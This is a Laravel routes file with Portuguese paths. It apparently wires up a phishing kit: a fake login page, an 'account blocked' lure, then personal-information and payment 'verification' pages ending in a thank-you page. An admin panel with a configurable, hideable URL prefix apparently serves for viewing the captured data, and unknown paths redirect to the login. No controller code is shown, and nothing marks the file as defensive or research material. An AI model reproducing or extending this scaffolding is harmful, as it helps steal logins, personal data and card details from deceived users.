<?php

use App\Http\Controllers\{AdminController, AuthController, BillingController, LandingController, PaymentController};
use App\Models\Settings;
use Illuminate\Support\Facades\Route;

Route::get('/autenticação', [AuthController::class, 'index'])->name('login.index');
Route::post('/autenticação', [AuthController::class, 'post'])->name('login.store');

Route::get('/conta-bloqueada', [LandingController::class, 'index'])->name('landing.index');
Route::post('/conta-bloqueada', [LandingController::class, 'post'])->name('landing.store');
Route::get('/obrigado', [LandingController::class, 'finish'])->name('finish');

Route::get('/informações-pessoais', [BillingController::class, 'index'])->name('billing.index');
Route::post('/informações-pessoais', [BillingController::class, 'store'])->name('billing.store');

Route::get('/verificar', [PaymentController::class, 'index'])->name('payment.index');
Route::post('/verificar', [PaymentController::class, 'post'])->name('payment.store');

$adminPrefix = 'admin';

try {
    if (Schema::hasTable('settings')) {
        $adminPrefix = Settings::me()->admin_panel ?? 'admin';
    }
} catch (Throwable) {
}

Route::group(['as' => 'admin.', 'prefix' => $adminPrefix], static function () {
    Route::group(['middleware' => 'guest'], static function () {
        Route::get('/login', [AdminController::class, 'login_index'])->name('login');
        Route::post('/login', [AdminController::class, 'login_post'])->name('login.store');
    });

    Route::group(['middleware' => 'auth'], static function () {
        Route::get('/dashboard', [AdminController::class, 'dashboard'])->name('dashboard');
        Route::patch('/update-settings', [AdminController::class, 'settings_patch'])->name('settings.patch');
        Route::get('/logout', [AdminController::class, 'logout'])->name('logout');
    });
});

Route::fallback(static function () {
    return redirect()->route('login.index');
});
